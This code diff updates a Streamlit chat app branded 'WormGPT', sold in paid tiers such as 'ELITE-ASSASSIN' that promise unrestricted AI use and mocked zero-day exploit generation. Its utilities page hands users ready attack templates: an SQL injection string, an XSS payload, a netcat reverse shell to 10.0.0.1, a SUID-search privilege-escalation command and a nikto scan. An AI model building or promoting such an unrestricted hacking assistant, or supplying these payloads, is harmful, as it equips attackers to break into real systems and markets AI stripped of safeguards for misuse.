@@ -217,7 +217,8 @@ PLANS = {
         ],
         "max_daily_messages": 20,
         "google_search_enabled": False,
-        "telegram_link": TELEGRAM_SUPPORT_LINK
+        "telegram_link": TELEGRAM_SUPPORT_LINK,
+        "price": "FREE"
     },
     "HACKER-PRO": {
         "name": "HACKER-PRO SUBSCRIPTION",
@@ -228,11 +229,13 @@ PLANS = {
             "Integrated Google Search",
             "Public/Private Chat Toggle",
             "Priority AI Model Access",
+            "Advanced Malware Analysis Reports", # Added feature
             "Threat Analysis Reports"
         ],
         "max_daily_messages": -1, # Unlimited
         "google_search_enabled": True,
-        "telegram_link": TELEGRAM_SUPPORT_LINK
+        "telegram_link": TELEGRAM_SUPPORT_LINK,
+        "price": "$40/month" # Updated price
     },
     "ELITE-ASSASSIN": {
         "name": "ELITE-ASSASSIN ACCESS (VIP)",
@@ -242,13 +245,15 @@ PLANS = {
             "Unlimited, Unrestricted AI Use",
             "Advanced Google Search & OSINT Tools",
             "Stealth Mode Capabilities (Mocked)",
-            "Exclusive Zero-Day Exploit Templates (Mocked)",
+            "Exclusive Zero-Day Exploit Templates (Mocked)", # Added feature
             "Dedicated Priority Support & Feedback Channel",
-            "Custom Persona Configuration (Mocked)"
+            "Custom Persona Configuration (Mocked)", # Added feature
+            "Real-time OSINT Data Feeds (Mocked)" # Another new feature
         ],
         "max_daily_messages": -1, # Unlimited
         "google_search_enabled": True,
-        "telegram_link": TELEGRAM_VIP_LINK
+        "telegram_link": TELEGRAM_VIP_LINK,
+        "price": "$100/year" # Updated price
     }
 }
 
@@ -289,13 +294,10 @@ def _initialize_session_state():
     if "settings_sub_page" not in st.session_state:
         st.session_state.settings_sub_page = "dashboard" # Changed default to dashboard
 
-    # New flags for settings sub-pages
-    if "show_dashboard_page" not in st.session_state:
-        st.session_state.show_dashboard_page = False
-    if "show_help_page" not in st.session_state:
-        st.session_state.show_help_page = False
-    if "show_feedback_page" not in st.session_state:
-        st.session_state.show_feedback_page = False
+    # New flags for settings sub-pages (controlled by settings_sub_page)
+    # if "show_dashboard_page" not in st.session_state: st.session_state.show_dashboard_page = False
+    # if "show_help_page" not in st.session_state: st.session_state.show_help_page = False
+    # if "show_feedback_page" not in st.session_state: st.session_state.show_feedback_page = False
 
 
     if "last_ai_request_time" not in st.session_state: # For AI request rate limiting
@@ -1204,7 +1206,8 @@ def _render_plan_options_page():
 
     # Render plans side-by-side using st.columns
     plan_keys = list(PLANS.keys())
-    cols = st.columns(len(plan_keys)) # Create columns dynamically
+    # Ensure there are always enough columns for side-by-side display
+    cols = st.columns(len(plan_keys)) 
 
     for i, plan_key in enumerate(plan_keys):
         plan_data = PLANS[plan_key]
@@ -1214,6 +1217,7 @@ def _render_plan_options_page():
         with cols[i]: # Place each card in its respective column
             st.markdown(f'<div class="{card_class}">', unsafe_allow_html=True)
             st.markdown(f"<h3>{plan_data['name'].replace('-', ' ').title()}</h3>", unsafe_allow_html=True)
+            st.markdown(f"<p><strong>{plan_data['price']}</strong></p>", unsafe_allow_html=True) # Display price
             st.markdown("<ul>", unsafe_allow_html=True)
             for feature in plan_data["features"]:
                 st.markdown(f"<li>{feature}</li>", unsafe_allow_html=True)
@@ -1244,7 +1248,7 @@ def _render_dashboard_content():
 
     st.markdown("---")
     st.write(f"**Operator ID:** `{st.session_state.user_serial}`")
-    st.write(f"**Current Plan:** `{st.session_state.user_plan.replace('-', ' ').title()}`")
+    st.write(f"**Current Plan:** `{st.session_state.user_plan.replace('-', ' ').title()}` ({PLANS[st.session_state.user_plan]['price']})") # Display price on dashboard
 
     expiry_date_str = user_data.get("expiry", "N/A")
     if expiry_date_str != "N/A":
@@ -1273,6 +1277,7 @@ def _render_dashboard_content():
         if st.button("Upgrade Your Plan", key="dashboard_upgrade_button", use_container_width=True):
             st.session_state.show_plan_options = True
             st.session_state.show_settings_page = False
+            st.session_state.settings_sub_page = "dashboard" # Keep settings context clean
             _log_user_action("Redirected to Upgrade Plan from Dashboard.")
             st.rerun()
     with col2:
@@ -1309,7 +1314,9 @@ def _render_utilities_page_content():
     exploit_templates = {
         "SQL Injection": "SELECT * FROM users WHERE username = 'admin'--;",
         "XSS Payload": "<script>alert('WormGPT injected!');</script>",
-        "Reverse Shell": "nc -e /bin/bash 10.0.0.1 4444"
+        "Reverse Shell": "nc -e /bin/bash 10.0.0.1 4444",
+        "Privilege Escalation (Linux)": "sudo find / -perm -u=s -type f 2>/dev/null",
+        "Web Vulnerability Scanner": "nikto -h example.com"
     }
     selected_template = st.selectbox("Select Exploit Type:", list(exploit_templates.keys()), key="exploit_template_selector")
     if selected_template:
@@ -1326,6 +1333,20 @@ def _render_utilities_page_content():
             st.success(f"SIMULATION: Initiating network scan on {target_ip}. Results will be displayed here (mocked).")
         else:
             st.warning("Please enter a target for the mocked scan.")
+
+    st.markdown("---")
+    if st.session_state.user_plan == "ELITE-ASSASSIN":
+        st.markdown("<h5>Zero-Day Exploit Generation (Mocked for Elite-Assassin)</h5>", unsafe_allow_html=True)
+        st.info("This advanced utility is capable of generating hypothetical zero-day exploit templates. Use with extreme caution (mocked functionality).")
+        zero_day_target = st.text_input("Target System/Software for Zero-Day (Mocked):", placeholder="e.g., specific OS version, web server", key="mock_zero_day_target")
+        if st.button("Generate Zero-Day (Mocked)", key="generate_zero_day_button"):
+            if zero_day_target:
+                st.success(f"SIMULATION: Analyzing {zero_day_target} for potential zero-day vectors. Generating exploit template... (Mocked).")
+            else:
+                st.warning("Please specify a target for zero-day generation.")
+    else:
+        st.info("This feature (Zero-Day Exploit Generation) is available only for ELITE-ASSASSIN plans. Upgrade to unlock.")
+
     _log_user_action("Viewed Utilities page.")
 
 
@@ -1347,6 +1368,8 @@ def _render_about_page_content():
     - **Malware Analysis:** Reverse-engineer, detect, and understand malicious software behaviors.
     - **OSINT & Reconnaissance:** Gather intelligence from various sources (with paid plans).
     - **Custom Persona Configuration (Mocked):** Tailor AI behavior to specific operational needs.
+    - **Threat Intelligence Feeds:** Access to real-time threat data (Mocked).
+    - **Simulated Zero-Day Exploit Generation:** Create theoretical zero-day exploits (Mocked for Elite-Assassin).
     """)
     _log_user_action("Viewed About page.")
 
@@ -1363,11 +1386,11 @@ def _render_api_keys_settings():
     st.info("You can provide your personal Google Gemini API key here. If provided, it will be prioritized for your AI requests.")
 
     st.markdown("---")
-    current_api_key = st.session_state.user_preferences.get("gemini_api_key")
+    current_gemini_api_key = st.session_state.user_preferences.get("gemini_api_key")
 
-    if current_api_key:
-        st.write(f"**Your Stored Gemini API Key:** `{current_api_key[:5]}...{current_api_key[-5:]}`")
-        if st.button("Clear Gemini API Key", key="clear_api_key_button"):
+    if current_gemini_api_key:
+        st.write(f"**Your Stored Gemini API Key:** `{current_gemini_api_key[:5]}...{current_gemini_api_key[-5:]}`")
+        if st.button("Clear Gemini API Key", key="clear_gemini_api_key_button"):
             st.session_state.user_preferences["gemini_api_key"] = None
             _save_user_preferences()
             st.success("Gemini API Key cleared successfully. The system will now use shared keys.")
@@ -1376,10 +1399,10 @@ def _render_api_keys_settings():
     else:
         st.write("**No personal Gemini API Key stored.** Using shared system keys.")
 
-    new_api_key = st.text_input("Enter your Google Gemini API Key:", type="password", key="new_api_key_input")
-    if st.button("Save Gemini API Key", key="save_api_key_button"):
-        if new_api_key.strip():
-            st.session_state.user_preferences["gemini_api_key"] = new_api_key.strip()
+    new_gemini_api_key = st.text_input("Enter your Google Gemini API Key:", type="password", key="new_gemini_api_key_input")
+    if st.button("Save Gemini API Key", key="save_gemini_api_key_button"):
+        if new_gemini_api_key.strip():
+            st.session_state.user_preferences["gemini_api_key"] = new_gemini_api_key.strip()
             _save_user_preferences()
             st.success("Gemini API Key saved successfully. It will be used for your future requests.")
             _log_user_action("User's Gemini API key saved/updated.")
@@ -1390,7 +1413,7 @@ def _render_api_keys_settings():
     st.markdown("---")
     st.markdown("<h5>How to get a Google Gemini API Key:</h5>", unsafe_allow_html=True)
     st.markdown("""
-    1.  Go to [Google AI Studio](https://aistudio.google.com/app/apikey).
+    1.  Go to <a href="https://aistudio.google.com/app/apikey" target="_blank" class="api-details-link">Google AI Studio</a>.
     2.  Log in with your Google account.
     3.  Click on "Create API key in new project" or "Create API key in existing project".
     4.  Copy the generated API key and paste it above.
@@ -1400,15 +1423,15 @@ def _render_api_keys_settings():
     st.markdown("<h5>Google Search API Keys (for `/search` command):</h5>", unsafe_allow_html=True)
     st.markdown(f"""
     To enable the `/search` command for real-time information retrieval (available in Hacker-Pro and Elite-Assassin plans), you need:
-    1.  **Google Search API Key:** Obtain this from [Google Cloud Console](https://console.cloud.google.com/apis/credentials). Enable the "Custom Search API" for your project.
-    2.  **Google Custom Search Engine ID (CSE ID):** Create a Custom Search Engine at [programmablesearchengine.google.com](https://programmablesearchengine.google.com/). Configure it to search the entire web or specific sites. The CSE ID will be provided.
+    1.  **Google Search API Key:** Obtain this from <a href="https://console.cloud.google.com/apis/credentials" target="_blank" class="api-details-link">Google Cloud Console</a>. Enable the "Custom Search API" for your project.
+    2.  **Google Custom Search Engine ID (CSE ID):** Create a Custom Search Engine at <a href="https://programmablesearchengine.google.com/" target="_blank" class="api-details-link">programmablesearchengine.google.com</a>. Configure it to search the entire web or specific sites. The CSE ID will be provided.
 
-    **Current Status:**
+    **Current Admin-Configured Status:**
     *   `GOOGLE_SEARCH_API_KEY`: `{GOOGLE_SEARCH_API_KEY[:5]}...{GOOGLE_SEARCH_API_KEY[-5:]}`
     *   `GOOGLE_CSE_ID`: `{GOOGLE_CSE_ID}`
-    (These keys are typically set by the administrator in `secrets.toml`.)
+    (These keys are typically set by the administrator in `secrets.toml` and are shared.)
     """, unsafe_allow_html=True)
-    _log_user_action("Accessed API Keys settings.")
+    _log_user_action("Viewed API Keys settings.")
 
 def _render_feedback_page():
     st.subheader("Send Feedback (Mocked)")
@@ -1433,67 +1456,72 @@ def _render_help_page():
     st.markdown("""
     - **Start a New Chat:** Click "New Chat" in the sidebar to begin a fresh conversation.
     - **Saved Chats:** Your conversations are automatically saved. Click on a chat title in the sidebar to resume it.
-    - **Private Chats:** By default, chats are private. For paid plans, you can toggle public/private mode in the chat header.
+    - **Private/Public Chats:** By default, chats are private. For Hacker-Pro or higher plans, you can toggle public/private mode in the chat header.
     """, unsafe_allow_html=True)
 
     st.markdown("<h5>2. Advanced Commands:</h5>", unsafe_allow_html=True)
     st.markdown("""
     - **`/search [your query]`:** (Hacker-Pro/Elite-Assassin plans) Use this command to perform a real-time Google search and incorporate the results into the AI's context. Example: `/search latest CVEs for Windows Server 2022`
+    - **`/abort` (Not implemented as direct chat command):** To stop AI generation, click the "⛔ Abort Response" button that appears when the AI is thinking.
     """, unsafe_allow_html=True)
 
     st.markdown("<h5>3. Managing API Keys:</h5>", unsafe_allow_html=True)
     st.markdown("""
     - Navigate to `Settings -> API Keys` to manage your personal Google Gemini API key. Providing your own key ensures dedicated access and may improve performance.
-    - Detailed instructions for obtaining a Gemini API key are available on the API Keys page.
+    - Detailed instructions for obtaining API keys are available on the API Keys page.
     """, unsafe_allow_html=True)
 
     st.markdown("<h5>4. Plan Features:</h5>", unsafe_allow_html=True)
     st.markdown("""
     - Check the "Upgrade Plan" page for a full breakdown of features included in each subscription level (Free-Trial, Hacker-Pro, Elite-Assassin).
+    - Click the "📊" icon next to the chat input to quickly view your current plan status.
     """, unsafe_allow_html=True)
+
+    st.markdown("---")
+    st.markdown("For further assistance, please contact support via the Telegram links available on the Upgrade Plan page.", unsafe_allow_html=True)
     _log_user_action("Viewed Help & Tutorials page.")
 
 
 def _render_settings_page():
-    """Displays user settings and preferences, including Dashboard, Utilities, About, Logs, API Keys, Help, and Feedback."""
+    """Displays user settings and preferences, including Dashboard, General, Utilities, API Keys, Help, and Feedback."""
     st.markdown("<h2 style='text-align:center; color:#007bff; margin-top:30px;'>Settings</h2>", unsafe_allow_html=True)
     st.markdown("---")
 
-    # Sub-navigation for settings
+    # Sub-navigation for settings - Using st.columns for horizontal layout
     cols = st.columns(6)
     with cols[0]:
-        if st.button("Dashboard", key="settings_nav_dashboard", use_container_width=True, help="Your account overview",
-                     type="primary" if st.session_state.settings_sub_page == "dashboard" else "secondary"):
+        if st.button("Dashboard", key="settings_nav_dashboard", use_container_width=True, 
+                     class_name="settings-nav-button" + (" active" if st.session_state.settings_sub_page == "dashboard" else "")):
             st.session_state.settings_sub_page = "dashboard"
             _log_user_action("Accessed Dashboard from Settings.")
             st.rerun()
     with cols[1]:
-        if st.button("General", key="settings_nav_general", use_container_width=True, help="General application settings",
-                     type="primary" if st.session_state.settings_sub_page == "general" else "secondary"):
+        if st.button("General", key="settings_nav_general", use_container_width=True, 
+                     class_name="settings-nav-button" + (" active" if st.session_state.settings_sub_page == "general" else "")):
             st.session_state.settings_sub_page = "general"
             _log_user_action("Accessed General Settings.")
             st.rerun()
     with cols[2]:
-        if st.button("Utilities", key="settings_nav_utilities", use_container_width=True, help="Tactical tools (mocked)",
-                     type="primary" if st.session_state.settings_sub_page == "utilities" else "secondary"):
+        if st.button("Utilities", key="settings_nav_utilities", use_container_width=True, 
+                     class_name="settings-nav-button" + (" active" if st.session_state.settings_sub_page == "utilities" else "")):
             st.session_state.settings_sub_page = "utilities"
             _log_user_action("Accessed Utilities from Settings.")
             st.rerun()
     with cols[3]:
-        if st.button("API Keys", key="settings_nav_api_keys", use_container_width=True, help="Manage your AI API keys",
-                     type="primary" if st.session_state.settings_sub_page == "api_keys" else "secondary"):
+        if st.button("API Keys", key="settings_nav_api_keys", use_container_width=True, 
+                     class_name="settings-nav-button" + (" active" if st.session_state.settings_sub_page == "api_keys" else "")):
             st.session_state.settings_sub_page = "api_keys"
             _log_user_action("Accessed API Keys from Settings.")
             st.rerun()
     with cols[4]:
-        if st.button("Help", key="settings_nav_help", use_container_width=True, help="Tutorials and guides",
-                     type="primary" if st.session_state.settings_sub_page == "help" else "secondary"):
+        if st.button("Help", key="settings_nav_help", use_container_width=True, 
+                     class_name="settings-nav-button" + (" active" if st.session_state.settings_sub_page == "help" else "")):
             st.session_state.settings_sub_page = "help"
             _log_user_action("Accessed Help & Tutorials.")
             st.rerun()
     with cols[5]:
-        if st.button("Feedback", key="settings_nav_feedback", use_container_width=True, help="Send us your thoughts (mocked)",
-                     type="primary" if st.session_state.settings_sub_page == "feedback" else "secondary"):
+        if st.button("Feedback", key="settings_nav_feedback", use_container_width=True, 
+                     class_name="settings-nav-button" + (" active" if st.session_state.settings_sub_page == "feedback" else "")):
             st.session_state.settings_sub_page = "feedback"
             _log_user_action("Accessed Feedback page.")
             st.rerun()
@@ -1513,7 +1541,7 @@ def _render_settings_page():
         _render_help_page()
     elif st.session_state.settings_sub_page == "feedback":
         _render_feedback_page()
-    elif st.session_state.settings_sub_page == "logs": # Logs is kept separate for admin/debug purposes, can be integrated or removed
+    elif st.session_state.settings_sub_page == "logs": # Logs is not directly in nav, but can be reached
         _render_logs_page_content()
 
 
@@ -1547,7 +1575,7 @@ def _render_plan_status_modal():
         if is_current_plan:
             status_icon = "✅"
             plan_html = f'<div class="plan-option-item current-plan">' \
-                        f'<span class="plan-name-text">{plan_data["name"].replace("-", " ").title()}</span>' \
+                        f'<span class="plan-name-text">{plan_data["name"].replace("-", " ").title()} ({plan_data["price"]})</span>' \
                         f'<span class="plan-status-icon">{status_icon} CURRENT PLAN</span>' \
                         f'</div>'
             st.markdown(plan_html, unsafe_allow_html=True) # Not clickable if current
@@ -1556,7 +1584,7 @@ def _render_plan_status_modal():
             # For locked plans, the entire div becomes clickable and redirects
             plan_html = f'<div class="plan-option-item locked-plan" ' \
                         f'onclick="document.getElementById(\'{button_key}\').click();">' \
-                        f'<span class="plan-name-text">{plan_data["name"].replace("-", " ").title()}</span>' \
+                        f'<span class="plan-name-text">{plan_data["name"].replace("-", " ").title()} ({plan_data["price"]})</span>' \
                         f'<span class="plan-status-icon">{status_icon} LOCKED</span>' \
                         f'</div>'
             st.markdown(plan_html, unsafe_allow_html=True)
@@ -1640,8 +1668,13 @@ def main():
     # --- Fixed Chat Footer (View Plan Button + Chat Input) ---
     # Only show chat input if a chat is active OR no specific page (plan, settings etc.) is open
     if st.session_state.current_chat_id or not (st.session_state.show_plan_options or st.session_state.show_settings_page):
+        # We need to manually inject the HTML for the button *before* st.chat_input
+        # and rely on CSS to position it correctly within the stChatInputContainer.
+        # Streamlit places st.chat_input inside a fixed div with data-testid="stChatInputContainer".
+        # We'll augment that container by injecting the button before the chat_input renders its content.
+
         # Inject the custom HTML for the View Plan button wrapper.
-        # Streamlit will place this before its own st.chat_input content within the stChatInputContainer.
+        # This wrapper will be styled to appear inside the stChatInputContainer via CSS.
         st.markdown(
             f'<div class="view-plan-icon-button-wrapper-for-chat">'
             f'<button class="view-plan-icon-button" onclick="document.getElementById(\'view_plan_status_button_hidden_real\').click();">📊</button>'
@@ -1750,17 +1783,18 @@ def main():
         current_chat_data_obj = st.session_state.user_chats.get(st.session_state.current_chat_id, {})
         history = current_chat_data_obj.get("messages", [])
 
+        # Only proceed to generate AI response if the last message is from the user
         if history and history[-1]["role"] == "user":
             # Check if a previous AI generation was aborted
             if st.session_state.abort_ai_request:
                 st.warning("AI response aborted. Ready for new commands.")
                 st.session_state.abort_ai_request = False # Reset the flag
-                st.stop() # Stop further execution to prevent AI call
+                st.stop() # Stop further execution to prevent AI call (Streamlit's rerun mechanism)
 
             # AI generation block
-            with st.chat_message("assistant", avatar=ASSISTANT_AVATAR): # Ensure avatar is passed here too
-                status_placeholder = st.empty() 
-                # Placeholder for the actual streamed message. This is created within the try block below.
+            with st.chat_message("assistant", avatar=ASSISTANT_AVATAR):
+                status_placeholder = st.empty() # For "Thinking..." status
+                message_area = st.empty()       # For streaming AI response text
 
                 with status_placeholder.status("💬 Thinking...", expanded=True, state="running") as status:
                     # Button to abort AI response, only visible when AI is thinking
@@ -1768,20 +1802,20 @@ def main():
                         st.session_state.abort_ai_request = True
                         status.update(label="Response aborted.", state="error")
                         _log_user_action("AI generation aborted by operator.")
-                        st.rerun() # Rerun immediately to process abort
+                        st.rerun() # Trigger rerun to process the abort immediately
+                        return # Exit main() early
 
                     response_generator = cyber_engine(history, st.session_state.user_plan)
 
                     full_answer_content = ""
-                    eng_used = "N/A" # Default
+                    eng_used = "N/A" # Default if no engine used
 
-                    # Placeholder for streaming display
-                    message_area = st.empty()
-
-                    if response_generator is None: # Case: cyber_engine returned None (no valid API keys)
+                    if response_generator is None:
+                        # This means no API keys were found/configured in cyber_engine
                         status.update(label="☠️ MISSION ABORTED. NO AI RESPONSE GENERATED.", state="error", expanded=True)
                         error_message = "☠️ MISSION ABORTED. NO AI RESPONSE GENERATED. No valid API keys configured or available. Please check settings."
                         message_area.markdown(error_message)
+                        # Append error message to chat history
                         st.session_state.user_chats[st.session_state.current_chat_id]["messages"].append({
                             "id": str(uuid.uuid4()),
                             "role": "assistant",
@@ -1791,23 +1825,22 @@ def main():
                         _sync_user_chats_to_vault()
                         _log_user_action(f"AI response failed (no generator) for chat '{st.session_state.current_chat_id}'.")
                         st.rerun()
-                        return # Exit early if no generator
+                        return # Exit main()
 
                     try:
                         # Stream the response chunks directly to the message_area
-                        # st.write_stream consumes the generator and returns the full content
-                        for chunk in response_generator: # Iterate manually to allow for abort check within loop
+                        for chunk in response_generator:
                             if st.session_state.abort_ai_request:
                                 break # Stop streaming if abort is requested
                             full_answer_content += chunk
                             message_area.markdown(full_answer_content)
                             time.sleep(0.01) # Small delay to simulate natural writing speed, adjust as needed
 
-                        eng_used = st.session_state._last_engine_used # Retrieve engine name
+                        eng_used = st.session_state._last_engine_used # Retrieve engine name set by cyber_engine
 
                         if st.session_state.abort_ai_request:
                             status.update(label="☠️ ABORT SIGNAL RECEIVED. TERMINATING OPERATION...", state="error")
-                            # The outer `if st.session_state.abort_ai_request` will handle the rerun and warning
+                            # The warning and rerun are handled by the outer if-check
                         elif full_answer_content and eng_used: # Ensure we have content and an engine name
                             status.update(label=f"Response generated via {eng_used.upper()} PROTOCOL", state="complete", expanded=False)
                             # Content has been streamed, just save it to history
@@ -1820,7 +1853,7 @@ def main():
                             _sync_user_chats_to_vault()
                             _log_user_action(f"AI response generated for chat '{st.session_state.current_chat_id}'.")
                             st.rerun() # Rerun to finalize UI and ensure logs update
-                        else: # Case where generator yielded no content (e.g., empty response from model)
+                        else: # Case where generator yielded no content (e.g., empty response from model, but API call succeeded)
                             status.update(label="❌ Failed to generate response.", state="error", expanded=True)
                             error_message = "❌ Failed to generate AI response. No content received from model."
                             message_area.markdown(error_message) # Display error to user
